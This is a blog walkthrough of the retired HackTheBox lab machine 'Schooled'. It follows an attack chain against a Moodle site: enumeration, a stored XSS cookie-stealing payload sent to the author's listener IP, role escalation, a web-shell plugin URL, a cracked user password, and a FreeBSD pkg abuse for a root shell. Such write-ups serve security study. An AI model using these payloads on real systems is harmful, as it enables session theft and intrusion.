---
layout: walkthrough
title: HackTheBox - Schooled
date: 2021-09-12 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/schooled.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at Schooled --`10.10.10.234`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Schooled/Overview.png"  style="width: 65%" />
</p>

## Information Gathering

In order to start the VM, I started with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

```bash
vagrant@ko:~/Desktop/HackTheBox/Schooled$ nmap -sC -sV 10.10.10.234
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-15 09:57 EDT
Nmap scan report for 10.10.10.234
Host is up (0.18s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.92 seconds
```

</details>


From the output shown above, we can see that the machine is a Linux machine and I added `schooled.htb` to the `/etc/hosts` file. As this is a Linux machine and it only has 2 open ports, I navigated to the web application and was presented with the following web page: 

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Schooled/img1.png"  style="width: 80%" />
</p>


The links in the application didn't lead anywhere, however I did find the contact information which divulged the following potential username:
- `admissions@schooled.htb`

Additionally, I saw that the application was designed by `html design`. I hadn't heard of that before so I navigated to the link: <https://html.design/>. 

> Bootstrap template and themes are designed for any type of corporate, business or agency websites. It’s a one-page and multiple page template with clean design, fully responsive and looks stunning on all devices. it’s very easy to use and customize, comes with trending features and unique design. The appearance will make your website have sophisticated and appealing look and even useful template for your work..

Since there wasn't very much to go on at this point, I started by performing some basic web enumeration. 

I ran the following Gobuster scan:
```bash
sudo gobuster dir -u http://schooled.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt 
```

This didn't provide me with a lot more information, so I also ran a subdomain scraper using the following command:

```bash
ffuf -c -u http://schooled.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.schooled.htb" -fs 20750
```

While running the command above, all subdomains were returning a success code with size 20750, so I filtered by the size and managed to find the following subdomain:

<details>

```bash
vagrant@ko:~$ ffuf -c -u http://schooled.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.schooled.htb" -fs 20750

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.1
________________________________________________

 :: Method           : GET
 :: URL              : http://schooled.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.schooled.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 20750
________________________________________________

moodle                  [Status: 200, Size: 84, Words: 5, Lines: 2]
:: Progress: [4989/4989] :: Job [1/1] :: 65 req/sec :: Duration: [0:01:28] :: Errors: 0 ::

```
</details>

After I added the subdomain to the `/etc/hosts` file, I browsed to the web page and was presented with the following Moodle page:


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Schooled/img2.png"  style="width: 80%" />
</p>


Using this page, I was able to retrieve several potential usernames which are provided below:
- Manuel Phillips
- Jane Higgins
- Jamie Borham
- Lianne Carter


I created an account for the application, luckily when attempting to create a valid email address, the sign-up page threw an error dictating the required format:

> This email is not one of those that are allowed (student.schooled.htb)

From there, I changed the email domain to match the requirements and logged in to the application:



<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Schooled/img3.png"  style="width: 80%" />
</p>




I found the following Moodle exploit and decided to run through the steps manually to trigger the RCE: <https://www.exploit-db.com/exploits/46551>.  This, however, required teacher access and unfortunately I was only able to register as a student. At this point, I decided to look into methods whereby I could either brute force a teacher's credentials or obtain their session cookie. Since I didn't have an email address for any of the teachers and I didn't know the format of the email addresses, I decided to start by attempting to perform a Cross Site Scripting (XSS) attack. 

I had student access which meant that I needed to determine which courses I could register for. It was only possible to enroll myself in the `Mathematics` course. Once I was enrolled, I saw that there were announcements, the most interesting of which is shown below:


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Schooled/img4.png"  style="width: 80%" />
</p>



From the screenshot above, it seemed as if `Manuel Phillips` would be checking each of the students MoodleNet profiles which seemed like a potential entry point.

### Cross Site Scripting (XSS)
> Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into trusted web sites. Cross-Site Scripting attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.

Navigating to my profile page: <http://moodle.schooled.htb/moodle/user/edit.php?id=30&returnto=profile>, it seemed as if `MoodleNet` was a specific field within the profile page. 

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Schooled/img5.png"  style="width: 55%" />
</p>


In order to test the theory, I created a simple XSS payload:
```html
<img src="http://10.10.14.157/?cookie="+ document.cookie />
```

Unfortunately, that payload did not return the cookie, so I changed the field to look for any errors:

```html
<img src=undefined onerror=this.src='http://10.10.14.157/?cookie='+document.cookie>
```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Schooled/img6.png"  style="width: 80%" />
</p>


Success! I now had the MoodleSession for `Manuel Phillips`. Using this session key, I was able to log in to the application and impersonate the `teacher` role. 


### Exploiting the Teacher Role

Once I edited the cookie and refreshed the page, I was authenticated as the teacher:


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Schooled/img7.png"  style="width: 80%" />
</p>


With access to the teacher role, I still didn't know the password so the RCE exploit would not be possible at this point. I needed to figure out another method so I started by looking for ways with which I could escalate my privileges. The following blog posts describes such a method: <https://www.cybersecurity-help.cz/vulnerabilities/31682/>.

> The vulnerability allows a remote attacker to escalate privileges on the system. The vulnerability exists as the application does not properly impose security restrictions within course enrolments. A remote authenticated attacker with teacher permission can escalate privileges from teacher role into manager role.

I navigated to the `Switch Role To` page:


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Schooled/img8.png"  style="width: 55%" />
</p>


I had access to the Teacher role so I needed to determine which user had manager access. Going back to the Schooled home page: <http://schooled.htb/teachers.html>, I determined that `Lianne Carter` was a Manager.

Since the vulnerability existed in the `Enrolment` phase, my theory was as follows:
- _Lianne Carter_ is a Manager so we will enroll her into Mathematics course.
- Intercept the request in burp and change the user_ID and Assign_ID of Teacher(Manuel Phillips) 
- Forward the request to enroll Manager.

I started by navigating to the `Participants` page in order to enrol a new user. After selecting the `Enrol Users` option, I selected _Lianne Carter_ and forwarded the request to Burpsuite.

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Schooled/img9.png"  style="width: 65%" />
</p>

Once I retrieved the request, I changed the `user_ID` to that of _Manuel Phillips_ and the `assign_ID` to `1`.


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Schooled/img10.png"  style="width: 80%" />
</p>


Once _Lianne Carter_ was enrolled in the course, I clicked on her profile and I was able to log into the application as the user:
<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Schooled/img11.png"  style="width: 55%" />
</p>


### Abusing Site Administration 
With access to the `Administrator` role, I now had access to `Site administration`:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Schooled/img12.png"  style="width: 65%" />
</p>

With access to these permissions, I was able to navigate over to site permissions and grant myself additional permissions to be able to install plugins while editing the `Manager` role using the following PoC: <https://github.com/HoangKien1020/CVE-2020-14321>. Finally, with the ability to install new plugins, I was able to upload a MoodleRCE plugin using the following PoC code: <https://github.com/HoangKien1020/Moodle_RCE>.

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Schooled/img13.png"  style="width: 80%" />
</p>

I ran into several issues during this phase stating that the Moodle plugin was `defective or outdated` as shown below: 

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Schooled/img14.png"  style="width: 80%" />
</p>


Eventually, after a lot of debugging, I finally managed to upload the plugin to the server. Now that the web shell was uploaded to the host, I navigated to the following URL and had Remote Code Execution (RCE) on the server in the form of a web shell:

```html
http://schooled.htb/blocks/rce/lang/en/block_rce.php?cmd=id
```

## Lateral Movement using WWW
Since I had RCE on the host, I started with some basic enumeration. During this phase, I found MySQL credentials within the `config.php` file in the `/usr/local/www/apache24/data/moodle` directory. 


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Schooled/img15.png"  style="width: 80%" />
</p>


Using this information, I logged into the MySQL instance and located the user table which was called `mdl_user`. There were several entries within the database so I decided to narrow the search down to user's with login permissions for the host which I identified within the `/etc/passwd` file. The only user's which were viable are listed below:

```text
root:*:0:0:Charlie &:/root:/bin/csh
jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh
steve:*:1002:1002:User &:/home/steve:/bin/csh
```

I used the following MySQL query to return the data from the database:

```sql
select * from mdl_user where firstname= "jamie"\G;
```


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Schooled/img16.png"  style="width: 80%" />
</p>

  
I copied the hashed password and started cracking it using JohnTheRipper with the `RockYou` wordlist. After a few minutes the password was cracked and I now had credentials which I could potentially use to access the machine: `jamie:!QAZ2wsx1`.

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Schooled/img17.png"  style="width: 80%" />
</p>


## Privilege Escalation using Jamie

With access to the `Jamie` user, I was able to SSH in to the host using the aforementioned credentials:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Schooled/img18.png"  style="width: 80%" />
</p>


Since I had access to the host and the user's password, I started with basic enumeration in the form of the `sudo -l` command:


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Schooled/img19.png"  style="width: 80%" />
</p>


I searched for a basic exploit using GTFOBins: <https://gtfobins.github.io/gtfobins/pkg/>. Unfortunately fpm was not installed on the host so I was not able to exploit this particular vulnerability in this manner. I did find a method to create packages on FreeBSD using the following blog post: <http://lastsummer.de/creating-custom-packages-on-freebsd/>. Using this information created a `exploit.sh` file and ran it using the following command:

```bash
sudo pkg install -U mypackage-“1.0_5”.txz
```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Schooled/img20.png"  style="width: 80%" />
</p>

Using the NetCat listener on my host, I was able to obtain the shell as root:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Schooled/img21.png"  style="width: 80%" />
</p>

That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.